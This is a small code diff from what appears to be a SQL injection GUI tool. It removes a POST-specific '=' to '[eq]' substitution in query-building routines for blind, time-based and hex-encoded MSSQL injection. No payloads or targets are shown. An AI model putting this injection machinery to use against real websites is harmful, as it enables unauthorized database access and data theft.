@@ -326,14 +326,12 @@ class Injector(QtCore.QThread):
                         return
                     self.columnSignal.emit(column_name, i)
                     self.progressSignal.emit(int(columnsInTable), False)
-        
+
     #Run Query     
     def runQuery(self):
         #If this select command
         if not self.vars['isStacked']:
             query = self.wq.buildQuery(self.dbType('query'), self.vars)
-            if self.vars['method'] == "POST":
-                query = query.replace("=", "[eq]")
             self.verbose("Fetching query result" , query)
             result = self.wq.httpRequest(query, False, self.vars)
             self.verbose(None , None, result)
@@ -448,8 +446,6 @@ class BlindInjector(QtCore.QThread):
         if self.vars['hexed']:
             hex = core.txtproc.strToHex(query, True)
             query = self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_hex']), self.vars, {'hex' : hex})
-        if self.vars['method'] == "POST":
-            query = query.replace("=", "[eq]")
         for resp in range(3):
             response = self.wq.httpRequest("", False, self.vars, True)
             self.verbose(None, {'rdata' : "Empty",  'rtime' : str(response)})
@@ -503,8 +499,6 @@ class BlindInjector(QtCore.QThread):
             if self.vars['hexed']:
                 hex = core.txtproc.strToHex(query, True)
                 query = self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_hex']), self.vars, {'hex' : hex})
-            if self.vars['method'] == "POST":
-                query = query.replace("=", "[eq]")
             for i in range(2):
                 self.verbose(query)
                 response = self.wq.httpRequest(query, False, self.vars, True)
@@ -617,8 +611,6 @@ class BlindInjector(QtCore.QThread):
                                         {'symbol_num' : str(self.symbol_num), 'condition' : " " + condition, 'delay' : str(self.vars['time'])})
         if self.vars['hexed'] :
             query = self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_hex']), self.vars,{'hex' : core.txtproc.strToHex(query, True)})
-        if self.vars['method'] == "POST":
-            query = query.replace("=", "[eq]")
         self.verbose(query)
         self.request_counter += 1
         response = self.wq.httpRequest(query, False, self.vars, True)
